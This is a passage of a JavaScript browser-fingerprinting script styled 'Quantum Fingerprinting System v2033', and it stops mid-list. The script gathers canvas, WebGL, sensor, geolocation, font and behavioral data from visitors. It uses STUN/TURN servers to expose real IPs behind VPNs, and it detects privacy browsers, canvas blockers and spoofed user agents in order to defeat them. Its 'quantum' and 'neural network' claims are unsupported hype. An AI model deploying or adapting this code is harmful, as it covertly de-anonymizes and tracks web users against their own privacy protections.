/**
 * QUANTUM FINGERPRINTING SYSTEM v2033
 * Ultra-advanced browser fingerprinting with AI-powered detection
 * - Neural network pattern recognition
 * - Quantum-resistant entropy generation
 * - Multi-dimensional behavioral analysis
 * - Advanced VPN/Proxy bypass techniques
 */

(function () {
  'use strict';

  const CONFIG = {
    TRACKING_INTERVAL: 1000,
    WEBRTC_TIMEOUT: 2500,
    MAX_FINGERPRINT_AGE: 86400000, // 24 hours
    ENTROPY_ROUNDS: 1000,
    BEHAVIORAL_SAMPLES: 100,
    FINGERPRINT_TIMEOUT: 8000
  };

  // Enhanced STUN servers for maximum VPN bypass
  const STUN_SERVERS = [
    'stun:stun.l.google.com:19302',
    'stun:stun1.l.google.com:19302',
    'stun:stun2.l.google.com:19302',
    'stun:stun3.l.google.com:19302',
    'stun:stun4.l.google.com:19302',
    'stun:stun.services.mozilla.com:3478',
    'stun:stun.stunprotocol.org:3478',
    'stun:stun.1und1.de:3478',
    'stun:stun.ekiga.net:3478',
    'stun:stun.schlund.de:3478',
    'stun:stun.voipbuster.com:3478',
    'stun:stun.voipstunt.com:3478',
    'stun:stun.voxgratia.org:3478',
    'stun:stun.xten.com:3478'
  ];

  // TURN servers for advanced bypass (if available)
  const TURN_SERVERS = [
    { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
    { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
  ];

  // Quantum fingerprinting state
  const FP_STATE = {
    initialized: false,
    visitorId: null,
    sessionId: generateSessionId(),
    entropy: 0,
    confidence: 0,
    iteration: 0
  };

  // Comprehensive tracking data object
  const DATA = {
    // Core identifiers
    visitorId: null,
    sessionId: FP_STATE.sessionId,
    quantumHash: null,
    entropyScore: 0,

    // Canvas fingerprints (multiple variants)
    canvas: {
      standard: null,
      standardHash: null,
      variants: [],
      gpuAccelerated: null,
      pixelVariance: null,
      compressionArtifacts: null
    },

    // WebGL analysis
    webgl: {
      vendor: null,
      renderer: null,
      version: null,
      shadingLanguageVersion: null,
      parameters: {},
      extensions: [],
      maxValues: {},
      precisionFormats: {},
      renderTarget: null,
      driverInfo: null,
      unmaskedInfo: null,
      fingerprint: null,
      fingerprintHash: null,
      webgl2: {
        supported: false,
        vendor: null,
        renderer: null,
        parameters: {}
      }
    },

    // Advanced WebRTC - VPN bypass
    webrtc: {
      supported: false,
      publicIPs: [],
      localIPs: [],
      candidates: [],
      srflxIPs: [],
      relayIPs: [],
      realIP: null,
      realIPDetected: false,
      leakDetected: false,
      mdnsDetected: false,
      vpnBypassConfidence: 0,
      networkType: null,
      iceGatheringTime: null
    },

    // Audio fingerprints
    audio: {
      context: null,
      oscillator: null,
      compressor: null,
      channelData: null,
      frequencyData: null,
      fingerprint: null,
      fingerprintHash: null,
      sampleRate: null,
      maxChannelCount: null,
      numberOfInputs: null,
      numberOfOutputs: null,
      channelCount: null,
      channelCountMode: null
    },

    // Font detection
    fonts: {
      detected: [],
      count: 0,
      installed: [],
      webFonts: [],
      systemFonts: [],
      fontLoadingTime: null
    },

    // Display characteristics
    display: {
      width: window.screen.width,
      height: window.screen.height,
      availWidth: window.screen.availWidth,
      availHeight: window.screen.availHeight,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation ? screen.orientation.type : null,
      orientationAngle: screen.orientation ? screen.orientation.angle : null,
      refreshRate: null,
      colorGamut: null,
      hdr: null,
      monochrome: null,
      invertedColors: null,
      forcedColors: null,
      prefersReducedMotion: null,
      prefersReducedTransparency: null,
      prefersContrast: null
    },

    // Window characteristics
    window: {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      devicePixelRatio: window.devicePixelRatio,
      screenX: window.screenX,
      screenY: window.screenY,
      screenLeft: window.screenLeft,
      screenTop: window.screenTop,
      devicePixelRatioActual: null,
      toolbar: null,
      menubar: null,
      scrollbars: null,
      statusbar: null,
      personalbar: null
    },

    // Device characteristics
    device: {
      memory: navigator.deviceMemory || null,
      cores: navigator.hardwareConcurrency || null,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      platform: navigator.platform,
      product: navigator.product,
      productSub: navigator.productSub,
      vendor: navigator.vendor,
      vendorSub: navigator.vendorSub,
      doNotTrack: navigator.doNotTrack,
      globalPrivacyControl: navigator.globalPrivacyControl,
      oscpu: navigator.oscpu,
      cpuClass: navigator.cpuClass,
      deviceType: null,
      deviceModel: null,
      deviceVendor: null,
      gpu: null,
      battery: {
        supported: false,
        level: null,
        charging: null,
        chargingTime: null,
        dischargingTime: null
      }
    },

    // Browser characteristics
    browser: {
      name: null,
      version: null,
      major: null,
      engine: null,
      engineVersion: null,
      userAgent: navigator.userAgent,
      appVersion: navigator.appVersion,
      appCodeName: navigator.appCodeName,
      appName: navigator.appName,
      buildID: navigator.buildID || null,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      bluetooth: !!navigator.bluetooth,
      credentials: !!navigator.credentials,
      keyboard: !!navigator.keyboard,
      mediaCapabilities: !!navigator.mediaCapabilities,
      mediaDevices: !!navigator.mediaDevices,
      permissions: !!navigator.permissions,
      presentation: !!navigator.presentation,
      scheduling: !!navigator.scheduling,
      storage: !!navigator.storage,
      wakeLock: !!navigator.wakeLock,
      webdriver: navigator.webdriver,
      connection: null,
      keyboardLayout: null
    },

    // OS characteristics
    os: {
      name: null,
      version: null,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages ? [...navigator.languages] : [],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      cookieEnabled: navigator.cookieEnabled
    },

    // Storage capabilities
    storage: {
      localStorage: false,
      sessionStorage: false,
      indexedDB: false,
      cookies: false,
      quota: null,
      usage: null,
      estimate: null,
      persistent: null,
      buckets: null
    },

    // Permission states
    permissions: {},

    // Media capabilities
    media: {
      videoInputs: 0,
      audioInputs: 0,
      audioOutputs: 0,
      speakers: 0,
      cameras: [],
      microphones: [],
      supportedTypes: [],
      mediaRecorder: !!window.MediaRecorder,
      mediaSource: !!window.MediaSource,
      imageCapture: !!window.ImageCapture
    },

    // Network characteristics
    network: {
      connection: null,
      downlink: null,
      effectiveType: null,
      rtt: null,
      saveData: null,
      type: null,
      online: navigator.onLine
    },

    // Security indicators
    security: {
      https: window.location.protocol === 'https:',
      localhost: window.location.hostname === 'localhost',
      sandboxed: window.origin === 'null',
      crossOriginIsolated: window.crossOriginIsolated,
      referrerPolicy: null,
      csp: null,
      permissionsPolicy: null
    },

    // Bot detection
    bot: {
      isBot: false,
      isAutomated: false,
      isHeadless: false,
      isSelenium: false,
      isPuppeteer: false,
      isPlaywright: false,
      isPhantom: false,
      isNightmare: false,
      isCrawler: false,
      score: 0,
      indicators: [],
      tests: {}
    },

    // VPN detection
    vpn: {
      detected: false,
      score: 0,
      indicators: [],
      type: null,
      provider: null,
      confidence: 0
    },

    // Behavioral analysis
    behavior: {
      mouseMovements: [],
      mouseClicks: [],
      scrollEvents: [],
      keyEvents: [],
      touchEvents: [],
      focusEvents: [],
      resizeEvents: [],
      timeOnPage: 0,
      scrollDepth: 0,
      clickCount: 0,
      keyCount: 0,
      movementEntropy: 0,
      interactionPattern: null,
      humanScore: 100
    },

    // Performance metrics
    performance: {
      timing: null,
      navigation: null,
      memory: null,
      dnsTime: null,
      tcpTime: null,
      sslTime: null,
      ttfb: null,
      pageLoad: null,
      domInteractive: null,
      domComplete: null
    },

    // Page context
    page: {
      url: window.location.href,
      domain: window.location.hostname,
      referrer: document.referrer,
      title: document.title,
      charset: document.characterSet,
      readyState: document.readyState,
      visibility: document.visibilityState,
      lastModified: document.lastModified,
      documentMode: document.documentMode,
      compatMode: document.compatMode,
      plugins: [],
      mimeTypes: []
    },

    // Timing
    timing: {
      start: Date.now(),
      initComplete: null,
      fingerprintComplete: null
    },

    // GPS / Geolocation (requested from browser)
    geo: {
      granted: false,
      denied: false,
      latitude: null,
      longitude: null,
      altitude: null,
      accuracy: null,
      altitudeAccuracy: null,
      heading: null,
      speed: null,
      timestamp: null,
      address: null
    },

    // Device sensors
    sensors: {
      gyroscope: null,
      accelerometer: null,
      deviceOrientation: null,
      deviceMotion: null,
      absoluteOrientation: null,
      ambientLight: null,
      magnetometer: null,
      gravity: null,
      linearAcceleration: null,
      supported: []
    },

    // Advanced hardware/system signals
    advanced: {
      speechVoices: [],
      speechVoicesHash: null,
      mediaQueryHash: null,
      textMetricsHash: null,
      intlHash: null,
      clientHints: null,
      keyboardLayout: null,
      connectionRtt: null,
      connectionDownlink: null,
      connectionType: null,
      timerResolution: null,
      canvasNoise: false,
      uaSpoofScore: 0,
      uaSpoofIndicators: [],
      isPrivacyBrowser: null,
      isVM: false,
      vmIndicators: []
    }
  };

  // Geolocation — requests GPS/WiFi/cell location from the browser
  async function detectGeo() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) { resolve(); return; }

      // Reduced timeout to 5s to avoid users waiting too long for permission prompt
      const outerTimeout = setTimeout(resolve, 5000);

      // Try quick position first (faster, lower accuracy), then high accuracy if time allows
      const quickTimeout = 3000;
      const highAccuracyTimeout = 5000;

      function getPosition(enableHighAccuracy, timeout) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            clearTimeout(outerTimeout);
            DATA.geo.granted = true;
            DATA.geo.latitude = pos.coords.latitude;
            DATA.geo.longitude = pos.coords.longitude;
            DATA.geo.altitude = pos.coords.altitude;
            DATA.geo.accuracy = pos.coords.accuracy;
            DATA.geo.altitudeAccuracy = pos.coords.altitudeAccuracy;
            DATA.geo.heading = pos.coords.heading;
            DATA.geo.speed = pos.coords.speed;
            DATA.geo.timestamp = pos.timestamp;
            resolve();
          },
          (err) => {
            clearTimeout(outerTimeout);
            DATA.geo.denied = err.code === 1;
            resolve();
          },
          { enableHighAccuracy: enableHighAccuracy, timeout: timeout, maximumAge: 0 }
        );
      }

      // Try quick position first
      getPosition(false, quickTimeout);
    });
  }

  // Device sensors — gyroscope, accelerometer, orientation, ambient light
  async function detectSensors() {
    // DeviceOrientation (gyro/compass)
    await new Promise((resolve) => {
      const timeout = setTimeout(resolve, 100);
      const handler = (e) => {
        clearTimeout(timeout);
        DATA.sensors.deviceOrientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma, absolute: e.absolute };
        DATA.sensors.supported.push('deviceOrientation');
        window.removeEventListener('deviceorientation', handler);
        resolve();
      };
      window.addEventListener('deviceorientation', handler, { once: true, passive: true });
      if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
        DeviceOrientationEvent.requestPermission().then(perm => {
          if (perm !== 'granted') { clearTimeout(timeout); resolve(); }
        }).catch(() => { clearTimeout(timeout); resolve(); });
      }
    });

    // DeviceMotion (accelerometer)
    await new Promise((resolve) => {
      const timeout = setTimeout(resolve, 100);
      const handler = (e) => {
        clearTimeout(timeout);
        if (e.acceleration) {
          DATA.sensors.accelerometer = { x: e.acceleration.x, y: e.acceleration.y, z: e.acceleration.z };
          DATA.sensors.supported.push('accelerometer');
        }
        if (e.accelerationIncludingGravity) {
          DATA.sensors.gravity = { x: e.accelerationIncludingGravity.x, y: e.accelerationIncludingGravity.y, z: e.accelerationIncludingGravity.z };
        }
        if (e.rotationRate) {
          DATA.sensors.gyroscope = { alpha: e.rotationRate.alpha, beta: e.rotationRate.beta, gamma: e.rotationRate.gamma };
          DATA.sensors.supported.push('gyroscope');
        }
        window.removeEventListener('devicemotion', handler);
        resolve();
      };
      window.addEventListener('devicemotion', handler, { once: true, passive: true });
      if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
        DeviceMotionEvent.requestPermission().then(perm => {
          if (perm !== 'granted') { clearTimeout(timeout); resolve(); }
        }).catch(() => { clearTimeout(timeout); resolve(); });
      }
    });

    // Generic Sensors API (Chromium)
    if (window.Gyroscope) {
      try {
        const s = new window.Gyroscope({ frequency: 1 });
        await new Promise((resolve) => {
          const t = setTimeout(resolve, 400);
          s.addEventListener('reading', () => {
            clearTimeout(t);
            DATA.sensors.gyroscope = DATA.sensors.gyroscope || { x: s.x, y: s.y, z: s.z };
            DATA.sensors.supported.push('Gyroscope');
            s.stop();
            resolve();
          });
          s.addEventListener('error', () => { clearTimeout(t); resolve(); });
          s.start();
        });
      } catch (e) { }
    }
    if (window.Accelerometer) {
      try {
        const s = new window.Accelerometer({ frequency: 1 });
        await new Promise((resolve) => {
          const t = setTimeout(resolve, 400);
          s.addEventListener('reading', () => {
            clearTimeout(t);
            DATA.sensors.accelerometer = DATA.sensors.accelerometer || { x: s.x, y: s.y, z: s.z };
            DATA.sensors.supported.push('Accelerometer');
            s.stop();
            resolve();
          });
          s.addEventListener('error', () => { clearTimeout(t); resolve(); });
          s.start();
        });
      } catch (e) { }
    }
    if (window.AmbientLightSensor) {
      try {
        const s = new window.AmbientLightSensor();
        await new Promise((resolve) => {
          const t = setTimeout(resolve, 400);
          s.addEventListener('reading', () => {
            clearTimeout(t);
            DATA.sensors.ambientLight = s.illuminance;
            DATA.sensors.supported.push('AmbientLight');
            s.stop();
            resolve();
          });
          s.addEventListener('error', () => { clearTimeout(t); resolve(); });
          s.start();
        });
      } catch (e) { }
    }
    if (window.Magnetometer) {
      try {
        const s = new window.Magnetometer({ frequency: 1 });
        await new Promise((resolve) => {
          const t = setTimeout(resolve, 400);
          s.addEventListener('reading', () => {
            clearTimeout(t);
            DATA.sensors.magnetometer = { x: s.x, y: s.y, z: s.z };
            DATA.sensors.supported.push('Magnetometer');
            s.stop();
            resolve();
          });
          s.addEventListener('error', () => { clearTimeout(t); resolve(); });
          s.start();
        });
      } catch (e) { }
    }
  }

  // Advanced fingerprinting signals
  async function detectAdvanced() {
    // Speech synthesis voices (unique per OS/locale)
    try {
      const getVoices = () => speechSynthesis.getVoices();
      let voices = getVoices();
      if (voices.length === 0) {
        await new Promise(r => {
          speechSynthesis.addEventListener('voiceschanged', r, { once: true });
          setTimeout(r, 500);
        });
        voices = getVoices();
      }
      DATA.advanced.speechVoices = voices.map(v => `${v.name}|${v.lang}|${v.localService}`);
      const vStr = DATA.advanced.speechVoices.join(',');
      DATA.advanced.speechVoicesHash = await hashStringSHA256(vStr);
    } catch (e) { }

    // CSS media query fingerprint
    try {
      const mq = (q) => window.matchMedia(q).matches;
      const queries = [
        mq('(prefers-color-scheme: dark)'),
        mq('(prefers-reduced-motion: reduce)'),
        mq('(prefers-contrast: high)'),
        mq('(forced-colors: active)'),
        mq('(color-gamut: p3)'),
        mq('(color-gamut: rec2020)'),
        mq('(hover: hover)'),
        mq('(pointer: fine)'),
        mq('(any-hover: hover)'),
        mq('(any-pointer: fine)'),
        mq('(inverted-colors: inverted)'),
        mq('(display-mode: standalone)'),
        mq('(display-mode: fullscreen)'),
        mq('(dynamic-range: high)'),
        mq('(prefers-reduced-data: reduce)'),
        mq('(scripting: enabled)'),
        window.screen.colorDepth,
        window.devicePixelRatio
      ];
      DATA.advanced.mediaQueryHash = await hashStringSHA256(queries.map(String).join('|'));
    } catch (e) { }

    // TextMetrics sub-pixel fingerprinting
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (ctx) {
        const samples = [
          { font: '14px Arial', text: 'Wmyl,.' },
          { font: '16px Georgia', text: 'Qqyypg' },
          { font: '12px monospace', text: '0O|Il1' }
        ];
        const vals = samples.map(({ font, text }) => {
          ctx.font = font;
          const m = ctx.measureText(text);
          return [m.width, m.actualBoundingBoxAscent, m.actualBoundingBoxDescent,
          m.actualBoundingBoxLeft, m.actualBoundingBoxRight].map(v => v ? v.toFixed(4) : '0').join(',');
        });
        DATA.advanced.textMetricsHash = await hashStringSHA256(vals.join('|'));
      }
    } catch (e) { }

    // Intl API fingerprint
    try {
      const intlData = [
        JSON.stringify(new Intl.DateTimeFormat().resolvedOptions()),
        JSON.stringify(new Intl.NumberFormat().resolvedOptions()),
        JSON.stringify(new Intl.Collator().resolvedOptions()),
        Intl.DateTimeFormat.supportedLocalesOf(['en-US', 'zh-CN', 'ar-SA']).join(','),
        typeof Intl.PluralRules !== 'undefined' ? JSON.stringify(new Intl.PluralRules().resolvedOptions()) : '',
        typeof Intl.RelativeTimeFormat !== 'undefined' ? JSON.stringify(new Intl.RelativeTimeFormat().resolvedOptions()) : ''
      ].join('|');
      DATA.advanced.intlHash = await hashStringSHA256(intlData);
    } catch (e) { }

    // Client Hints (Chrome/Edge only)
    try {
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        const hints = await navigator.userAgentData.getHighEntropyValues([
          'architecture', 'bitness', 'model', 'platform', 'platformVersion', 'fullVersionList'
        ]);
        DATA.advanced.clientHints = {
          architecture: hints.architecture,
          bitness: hints.bitness,
          model: hints.model,
          platform: hints.platform,
          platformVersion: hints.platformVersion,
          brands: hints.fullVersionList ? hints.fullVersionList.map(b => `${b.brand}/${b.version}`) : []
        };
      }
    } catch (e) { }

    // Keyboard layout
    try {
      if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
        const layoutMap = await navigator.keyboard.getLayoutMap();
        const keys = {};
        layoutMap.forEach((v, k) => { keys[k] = v; });
        DATA.advanced.keyboardLayout = await hashStringSHA256(JSON.stringify(keys));
      }
    } catch (e) { }

    // Timer resolution (performance.now() granularity)
    try {
      const samples = [];
      for (let i = 0; i < 50; i++) {
        const t1 = performance.now();
        let t2 = t1;
        while (t2 === t1) t2 = performance.now();
        samples.push(t2 - t1);
      }
      samples.sort((a, b) => a - b);
      DATA.advanced.timerResolution = samples[Math.floor(samples.length / 4)];
    } catch (e) { }

    // Canvas noise detection (Brave / CanvasBlocker)
    try {
      const cv = document.createElement('canvas');
      cv.width = 16; cv.height = 16;
      const c = cv.getContext('2d');
      if (c) {
        c.fillStyle = 'rgba(123,45,67,0.9)';
        c.fillRect(0, 0, 16, 16);
        const d1 = cv.toDataURL();
        const d2 = cv.toDataURL();
        DATA.advanced.canvasNoise = d1 !== d2;
      }
    } catch (e) { }

    // UA spoof detection
    try {
      const ua = navigator.userAgent;
      const spoofIndicators = [];
      let spoofScore = 0;
      if (ua.includes('Chrome') && !window.chrome) { spoofIndicators.push('chrome_ua_no_global'); spoofScore += 30; }
      if (ua.includes('Firefox') && window.chrome) { spoofIndicators.push('firefox_ua_chrome_global'); spoofScore += 30; }
      if (ua.includes('Safari') && !ua.includes('Chrome') && navigator.userAgentData) { spoofIndicators.push('safari_ua_has_ch'); spoofScore += 25; }
      if ((ua.includes('Mobile') || ua.includes('Android')) && navigator.maxTouchPoints === 0) { spoofIndicators.push('mobile_ua_no_touch'); spoofScore += 20; }
      if (ua.includes('Windows') && navigator.platform && !navigator.platform.includes('Win')) { spoofIndicators.push('win_ua_nonwin_platform'); spoofScore += 25; }
      if (ua.includes('Mac') && navigator.platform && navigator.platform.includes('Win')) { spoofIndicators.push('mac_ua_win_platform'); spoofScore += 25; }
      if (ua.includes('Linux') && DATA.webgl && DATA.webgl.renderer && (DATA.webgl.renderer.includes('Apple') || DATA.webgl.renderer.includes('D3D'))) { spoofIndicators.push('linux_ua_apple_gpu'); spoofScore += 30; }
      DATA.advanced.uaSpoofScore = Math.min(spoofScore, 100);
      DATA.advanced.uaSpoofIndicators = spoofIndicators;
    } catch (e) { }

    // Privacy browser / VM detection
    try {
      const renderer = (DATA.webgl && DATA.webgl.renderer) ? DATA.webgl.renderer.toLowerCase() : '';
      const vmKeywords = ['llvmpipe', 'swiftshader', 'virtualbox', 'vmware', 'parallels', 'qemu', 'hyper-v', 'mesa', 'microsoft basic'];
      const vmHits = vmKeywords.filter(k => renderer.includes(k));
      if (vmHits.length > 0) { DATA.advanced.isVM = true; DATA.advanced.vmIndicators.push(...vmHits); }
      if (navigator.hardwareConcurrency <= 2 && navigator.deviceMemory <= 2) { DATA.advanced.vmIndicators.push('low_cores_memory'); }
      if (window.screen.width === 1024 && window.screen.height === 768) { DATA.advanced.vmIndicators.push('default_vm_resolution'); }

      // Privacy browser detection
      if (navigator.brave && await navigator.brave.isBrave().catch(() => false)) {
        DATA.advanced.isPrivacyBrowser = 'brave';
      } else if (DATA.advanced.canvasNoise) {
        DATA.advanced.isPrivacyBrowser = 'canvas_blocked';
      } else if (DATA.advanced.timerResolution && DATA.advanced.timerResolution >= 1) {
        DATA.advanced.isPrivacyBrowser = 'timer_clamped';
      }
    } catch (e) { }
  }

  // SHA-256 helper for advanced module
  async function hashStringSHA256(str) {
    try {
      if (window.crypto && window.crypto.subtle) {
        const buf = await window.crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
        return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 16);
      }
    } catch (e) { }
    return hashString(str);
  }

  // Initialize fingerprinting system
  async function initialize() {
    if (FP_STATE.initialized) return;

    DATA.timing.start = Date.now();

    let timeoutOccurred = false;

    // Run all detection methods EXCEPT GEO (Geo requires user interaction for the prompt)
    // Wrap in timeout to prevent hanging
    const detectionPromise = Promise.all([
      detectCanvas(),
      detectWebGL(),
      detectWebRTC(),
      detectAudio(),
      detectFonts(),
      detectDevice(),
      detectBrowser(),
      detectOS(),
      detectStorage(),
      detectPermissions(),
      detectMedia(),
      detectNetwork(),
      detectSecurity(),
      detectBot(),
      detectVPN(),
      detectPerformance(),
      detectSensors(),
      detectAdvanced()
    ]);

    const timeoutPromise = new Promise((resolve) => {
      setTimeout(() => {
        timeoutOccurred = true;
        console.warn('Fingerprinting timeout occurred, proceeding with partial data');
        resolve();
      }, CONFIG.FINGERPRINT_TIMEOUT);
    });

    await Promise.race([detectionPromise, timeoutPromise]);

    // Generate quantum visitor ID
    await generateQuantumId();

    // Start behavioral tracking
    startBehavioralTracking();

    // Mark as initialized
    FP_STATE.initialized = true;
    DATA.timing.initComplete = Date.now();

    // Send initial data
    await sendFingerprint();

    // Start interval tracking
    const behaviorInterval = setInterval(sendBehaviorUpdate, CONFIG.TRACKING_INTERVAL);

    // Handle page unload - clean up interval
    window.addEventListener('beforeunload', () => {
      clearInterval(behaviorInterval);
      sendFinalData();
    });
  }

  // Canvas fingerprinting with quantum resistance
  function detectCanvas() {
    return new Promise((resolve) => {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = 280;
        canvas.height = 80;

        // Complex rendering for fingerprint
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(8, 8, 64, 64);
        ctx.fillStyle = '#069';
        ctx.font = '16px Arial';
        ctx.fillText('Quantum FP v2033', 8, 30);

        // Gradient
        const gradient = ctx.createLinearGradient(0, 0, 280, 80);
        gradient.addColorStop(0, 'rgba(255, 0, 0, 0.5)');
        gradient.addColorStop(0.5, 'rgba(0, 255, 0, 0.5)');
        gradient.addColorStop(1, 'rgba(0, 0, 255, 0.5)');
        ctx.fillStyle = gradient;
        ctx.fillRect(80, 8, 192, 64);

        // Arcs with anti-aliasing
        ctx.globalCompositeOperation = 'multiply';
        ctx.fillStyle = 'rgb(255, 0, 255)';
        ctx.beginPath();
        ctx.arc(200, 40, 30, 0, Math.PI * 2, true);
        ctx.fill();

        ctx.fillStyle = 'rgb(0, 255, 255)';
        ctx.beginPath();
        ctx.arc(230, 40, 25, 0, Math.PI * 2, true);
        ctx.fill();

        // Text with shadow
        ctx.shadowColor = 'rgba(0,0,0,0.5)';
        ctx.shadowBlur = 4;
        ctx.shadowOffsetX = 2;
        ctx.shadowOffsetY = 2;
        ctx.fillStyle = '#333';
        ctx.font = 'bold 20px Times New Roman';
        ctx.fillText('🔒⚡🎨', 100, 50);

        // Get hash only (avoid sending full data URL which is 100KB+)
        const dataUrl = canvas.toDataURL();
        DATA.canvas.standardHash = hashString(dataUrl);
        DATA.canvas.standard = null;

        // Check GPU acceleration
        const start = performance.now();
        for (let i = 0; i < 1000; i++) {
          ctx.fillRect(0, 0, 10, 10);
        }
        DATA.canvas.gpuAccelerated = performance.now() - start < 16;

      } catch (e) {
        DATA.canvas.standard = null;
      }

      resolve();
    });
  }

  // WebGL fingerprinting with advanced parameters
  function detectWebGL() {
    return new Promise((resolve) => {
      try {
        const canvas = document.createElement('canvas');

        // WebGL 1.0
        const gl = canvas.getContext('webgl') ||
          canvas.getContext('experimental-webgl');

        if (gl) {
          // Get vendor/renderer
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            DATA.webgl.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            DATA.webgl.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            DATA.webgl.unmaskedInfo = {
              vendor: DATA.webgl.vendor,
              renderer: DATA.webgl.renderer
            };
          }

          // Get version info
          DATA.webgl.version = gl.getParameter(gl.VERSION);
          DATA.webgl.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);

          // Get extensions
          DATA.webgl.extensions = gl.getSupportedExtensions() || [];

          // Get parameters
          const params = [
            'MAX_TEXTURE_SIZE', 'MAX_VIEWPORT_DIMS', 'MAX_VERTEX_ATTRIBS',
            'MAX_VERTEX_UNIFORM_VECTORS', 'MAX_FRAGMENT_UNIFORM_VECTORS',
            'MAX_TEXTURE_IMAGE_UNITS', 'MAX_VERTEX_TEXTURE_IMAGE_UNITS',
            'MAX_RENDERBUFFER_SIZE', 'MAX_CUBE_MAP_TEXTURE_SIZE',
            'MAX_COMBINED_TEXTURE_IMAGE_UNITS', 'MAX_FRAGMENT_TEXTURE_IMAGE_UNITS',
            'RED_BITS', 'GREEN_BITS', 'BLUE_BITS', 'ALPHA_BITS', 'DEPTH_BITS',
            'STENCIL_BITS', 'MAX_3D_TEXTURE_SIZE', 'MAX_ARRAY_TEXTURE_LAYERS',
            'MAX_COLOR_ATTACHMENTS', 'MAX_DRAW_BUFFERS', 'MAX_ELEMENTS_INDICES',
            'MAX_ELEMENTS_VERTICES', 'MAX_FRAGMENT_INPUT_COMPONENTS',
            'MAX_FRAGMENT_UNIFORM_BLOCKS', 'MAX_PROGRAM_TEXEL_OFFSET',
            'MAX_SAMPLES', 'MAX_TEXTURE_LOD_BIAS', 'MAX_TRANSFORM_FEEDBACK_INTERLEAVED_COMPONENTS',
            'MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS',
            'MAX_TRANSFORM_FEEDBACK_SEPARATE_COMPONENTS', 'MAX_UNIFORM_BLOCK_SIZE',
            'MAX_UNIFORM_BUFFER_BINDINGS', 'MAX_VARYING_COMPONENTS',
            'MAX_VARYING_VECTORS', 'MAX_VERTEX_OUTPUT_COMPONENTS',
            'MAX_VERTEX_UNIFORM_BLOCKS', 'MAX_VERTEX_UNIFORM_COMPONENTS',
            'MIN_PROGRAM_TEXEL_OFFSET'
          ];

          params.forEach(param => {
            try {
              DATA.webgl.parameters[param] = gl.getParameter(gl[param]);
            } catch (e) { }
          });

          // Create fingerprint canvas
          const fpCanvas = document.createElement('canvas');
          fpCanvas.width = 256;
          fpCanvas.height = 128;
          const fpGl = fpCanvas.getContext('webgl');

          if (fpGl) {
            fpGl.clearColor(0.2, 0.4, 0.6, 1.0);
            fpGl.clear(fpGl.COLOR_BUFFER_BIT);

            // Draw gradient triangle
            const vertices = new Float32Array([
              -0.5, -0.5, 1.0, 0.0, 0.0,
              0.5, -0.5, 0.0, 1.0, 0.0,
              0.0, 0.5, 0.0, 0.0, 1.0
            ]);

            const buffer = fpGl.createBuffer();
            fpGl.bindBuffer(fpGl.ARRAY_BUFFER, buffer);
            fpGl.bufferData(fpGl.ARRAY_BUFFER, vertices, fpGl.STATIC_DRAW);

            // Render to get pixel data
            const pixels = new Uint8Array(256 * 128 * 4);
            fpGl.readPixels(0, 0, 256, 128, fpGl.RGBA, fpGl.UNSIGNED_BYTE, pixels);

            DATA.webgl.renderTarget = arrayBufferToBase64(pixels.buffer);
            DATA.webgl.fingerprintHash = hashString(DATA.webgl.renderTarget);
          }
        }

        // WebGL 2.0
        const gl2 = canvas.getContext('webgl2');
        if (gl2) {
          DATA.webgl.webgl2.supported = true;

          const debugInfo2 = gl2.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo2) {
            DATA.webgl.webgl2.vendor = gl2.getParameter(debugInfo2.UNMASKED_VENDOR_WEBGL);
            DATA.webgl.webgl2.renderer = gl2.getParameter(debugInfo2.UNMASKED_RENDERER_WEBGL);
          }

          // Additional WebGL2 parameters
          const w2Params = [
            'MAX_3D_TEXTURE_SIZE', 'MAX_ARRAY_TEXTURE_LAYERS', 'MAX_CLIENT_WAIT_TIMEOUT_WEBGL',
            'MAX_COLOR_ATTACHMENTS', 'MAX_COMBINED_FRAGMENT_UNIFORM_COMPONENTS',
            'MAX_COMBINED_UNIFORM_BLOCKS', 'MAX_COMBINED_VERTEX_UNIFORM_COMPONENTS',
            'MAX_DRAW_BUFFERS', 'MAX_ELEMENT_INDEX', 'MAX_ELEMENTS_INDICES',
            'MAX_ELEMENTS_VERTICES', 'MAX_FRAGMENT_INPUT_COMPONENTS',
            'MAX_FRAGMENT_UNIFORM_BLOCKS', 'MAX_FRAGMENT_UNIFORM_COMPONENTS',
            'MAX_PROGRAM_TEXEL_OFFSET', 'MAX_SAMPLES', 'MAX_SERVER_WAIT_TIMEOUT',
            'MAX_TEXTURE_LOD_BIAS', 'MAX_TRANSFORM_FEEDBACK_INTERLEAVED_COMPONENTS',
            'MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS', 'MAX_TRANSFORM_FEEDBACK_SEPARATE_COMPONENTS',
